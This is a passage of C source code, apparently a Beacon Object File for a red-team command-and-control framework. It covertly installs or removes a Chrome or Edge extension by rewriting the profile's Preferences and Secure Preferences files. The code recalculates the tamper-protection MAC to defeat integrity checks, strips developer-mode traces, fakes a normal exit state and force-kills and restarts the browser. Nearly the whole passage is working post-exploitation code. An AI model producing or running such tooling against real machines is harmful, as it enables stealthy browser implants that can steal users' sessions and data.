            cJSON_DeleteItemFromObjectCaseSensitive(settings, extensionId);

        if (isSecurePrefs)
        {
            cJSON* ui = cJSON_GetObjectItemCaseSensitive(extensions, "ui");
            if (ui)
                cJSON_DeleteItemFromObjectCaseSensitive(ui, "developer_mode");
        }

        if (!isSecurePrefs)
        {
            cJSON* ui = cJSON_GetObjectItemCaseSensitive(extensions, "ui");
            if (ui)
            {
                cJSON_DeleteItemFromObjectCaseSensitive(ui, "dev_mode_warning_snooze_end_time");
                DPRINTF("[+] Removed dev_mode_warning_snooze_end_time\n");
            }
        }
    }

    if (isSecurePrefs)
    {
        cJSON* protection = cJSON_GetObjectItemCaseSensitive(data, "protection");
        cJSON* macs = protection ? cJSON_GetObjectItemCaseSensitive(protection, "macs") : NULL;
        if (macs)
        {
            cJSON* extMacs = cJSON_GetObjectItemCaseSensitive(macs, "extensions");
            if (extMacs)
            {
                cJSON* settingsMacs = cJSON_GetObjectItemCaseSensitive(extMacs, "settings");
                if (settingsMacs)
                    cJSON_DeleteItemFromObjectCaseSensitive(settingsMacs, extensionId);

                cJSON* uiMacs = cJSON_GetObjectItemCaseSensitive(extMacs, "ui");
                if (uiMacs)
                {
                    cJSON_DeleteItemFromObjectCaseSensitive(uiMacs, "developer_mode");
                    cJSON_DeleteItemFromObjectCaseSensitive(uiMacs, "developer_mode_encrypted_hash");
                }
            }
        }
    }

    // profile.exit_type = "Normal"
    cJSON* profile = cJSON_GetObjectItemCaseSensitive(data, "profile");
    if (profile)
    {
        cJSON_DeleteItemFromObjectCaseSensitive(profile, "exit_type");
        cJSON_AddStringToObject(profile, "exit_type", "Normal");
    }

    // First write (without updated super_mac)
    if (!write_json_file(prefFilePath, data))
    {
        DPRINTF("[-] Failed to write: %s\n", prefFilePath);
        cJSON_Delete(data);
        return FALSE;
    }

    if (isSecurePrefs)
    {
        // Recalculate super_mac
        char superMac[65];
        if (!calculate_super_mac(prefFilePath, sid, seed, seedLen, superMac))
        {
            DPRINTF("[-] Failed to calculate super_mac\n");
            cJSON_Delete(data);
            return FALSE;
        }
        DPRINTF("[+] Revert Super MAC: %s\n", superMac);

        cJSON* protection = cJSON_GetObjectItemCaseSensitive(data, "protection");
        cJSON_DeleteItemFromObjectCaseSensitive(protection, "super_mac");
        cJSON_AddStringToObject(protection, "super_mac", superMac);

        if (!write_json_file(prefFilePath, data))
        {
            DPRINTF("[-] Failed to write super_mac: %s\n", prefFilePath);
            cJSON_Delete(data);
            return FALSE;
        }
    }

    cJSON_Delete(data);
    return TRUE;
}

/* ============================================================
 * Entry point
 * ============================================================ */

#ifdef BOF

VOID go(
    IN PCHAR Buffer,
    IN ULONG Length
)
{
    if (!bofstart())
    {
        return;
    }

    datap parser;
    BeaconDataParse(&parser, Buffer, Length);

    int action = BeaconDataInt(&parser);
    char* browser = BeaconDataExtract(&parser, NULL);
    char* sid = BeaconDataExtract(&parser, NULL);
    char* profilePath = BeaconDataExtract(&parser, NULL);
    char* extensionPath = BeaconDataExtract(&parser, NULL);
    int force = BeaconDataInt(&parser);
    char* backupExt = BeaconDataExtract(&parser, NULL);
    if (!backupExt || strlen(backupExt) == 0)
        backupExt = "backupssc";

    if (!browser || !profilePath)
    {
        internal_printf("[-] Missing required arguments: /browser and /profilepath\n");
        printoutput(TRUE);
        return;
    }

    if (MSVCRT$_stricmp(browser, "chrome") != 0 && MSVCRT$_stricmp(browser, "msedge") != 0)
    {
        internal_printf("[-] Unsupported browser: %s\n", browser);
        printoutput(TRUE);
        return;
    }

    if (!extensionPath || strlen(extensionPath) == 0)
    {
        internal_printf("[-] Extension path required (/extpath)\n");
        printoutput(TRUE);
        return;
    }

    // Auto-detect SID if not provided
    char resolvedSid[256] = {0};
    if (!sid || strlen(sid) == 0)
    {
        if (!get_current_sid(resolvedSid, sizeof(resolvedSid)))
        {
            internal_printf("[-] Failed to resolve current SID. Provide /sid explicitly.\n");
            printoutput(TRUE);
            return;
        }
        sid = resolvedSid;
        DPRINTF("[+] Auto-detected SID: %s\n", sid);
    }

    DPRINTF("[+] Action: %s\n", action == ACTION_INSTALL ? "install" : "revert");
    DPRINTF("[+] Browser: %s\n", browser);
    DPRINTF("[+] SID: %s\n", sid);
    DPRINTF("[+] Profile Path: %s\n", profilePath);
    DPRINTF("[+] Backup ext: %s\n", backupExt);

    char securePrefsPath[512];
    char prefsPath[512];
    get_prefs_paths(profilePath, browser, securePrefsPath, prefsPath);

    BOOL browserWasRunning = is_browser_running(browser, sid);
    DPRINTF("[+] Browser running: %s\n", browserWasRunning ? "yes" : "no");

    if (action == ACTION_INSTALL)
    {
        char extId[33];
        generate_extension_id(extensionPath, extId);
        DPRINTF("[+] Extension Path: %s\n", extensionPath);
        DPRINTF("[+] Extension ID: %s\n", extId);

        if (browserWasRunning && !force)
        {
            internal_printf("[!] Browser is running. Cannot install while browser is open.\n");
            internal_printf("[!] Use /force to kill the browser, install, and restart.\n");
            internal_printf("[!] Or wait/close the browser first and run again.\n");
            printoutput(TRUE);
            return;
        }

        if (browserWasRunning && force)
        {
            DPRINTF("[+] Killing browser processes...\n");
            int killed = kill_browser_processes(browser, sid);
            DPRINTF("[+] Killed %d processes\n", killed);
            KERNEL32$Sleep(500);
        }

        if (!create_backups(securePrefsPath, prefsPath, backupExt))
        {
            internal_printf("[-] Backup failed - aborting\n");
            printoutput(TRUE);
            return;
        }

        if (!add_extension(sid, extensionPath, extId, securePrefsPath, browser, TRUE))
        {
            internal_printf("[-] Failed to install to Secure Preferences\n");
            printoutput(TRUE);
            return;
        }
        DPRINTF("[+] Installed to Secure Preferences\n");

        if (!add_extension(sid, extensionPath, extId, prefsPath, browser, FALSE))
        {
            internal_printf("[-] Failed to install to Preferences\n");
            printoutput(TRUE);
            return;
        }
        DPRINTF("[+] Installed to Preferences\n");

        if (browserWasRunning && force)
        {
            DPRINTF("[+] Restarting browser...\n");
            restart_browser(browser, profilePath);
        }

        internal_printf("[+] Done\n");
    }
    else if (action == ACTION_REVERT)
    {
        char extId[33];
        generate_extension_id(extensionPath, extId);
        DPRINTF("[+] Extension Path: %s\n", extensionPath);
        DPRINTF("[+] Extension ID: %s\n", extId);

        if (browserWasRunning && !force)
        {
            internal_printf("[!] Browser is running. Cannot revert while browser is open.\n");
            internal_printf("[!] Use /force to kill, revert, and restart.\n");
            internal_printf("[!] Or wait/close the browser\n");
            printoutput(TRUE);
            return;
        }

        if (browserWasRunning && force)
        {
            DPRINTF("[+] Killing browser processes...\n");
            int killed = kill_browser_processes(browser, sid);
            DPRINTF("[+] Killed %d processes\n", killed);
            KERNEL32$Sleep(500);
        }

        BOOL revertOk = TRUE;

        if (!remove_extension(sid, extId, securePrefsPath, browser, TRUE))
        {
            internal_printf("[-] Failed to revert Secure Preferences\n");
            revertOk = FALSE;
        }
        else
        {
            DPRINTF("[+] Reverted Secure Preferences\n");
        }

        if (!remove_extension(sid, extId, prefsPath, browser, FALSE))
        {
            internal_printf("[-] Failed to revert Preferences\n");
            revertOk = FALSE;
        }
        else
        {
            DPRINTF("[+] Reverted Preferences\n");
        }

        if (revertOk)
        {
            // Clean up backup files only on success
            char backupPath[512];
            sprintf(backupPath, "%s.%s", securePrefsPath, backupExt);
            if (file_exists(backupPath))
                KERNEL32$DeleteFileA(backupPath);
            sprintf(backupPath, "%s.%s", prefsPath, backupExt);
            if (file_exists(backupPath))
                KERNEL32$DeleteFileA(backupPath);
            internal_printf("[+] Done\n");
        }
        else
        {
            internal_printf("[-] Revert had errors. Backup files preserved.\n");
        }

        if (browserWasRunning && force)
        {
            DPRINTF("[+] Restarting browser...\n");
            restart_browser(browser, profilePath);
        }
    }

    printoutput(TRUE);
};

#endif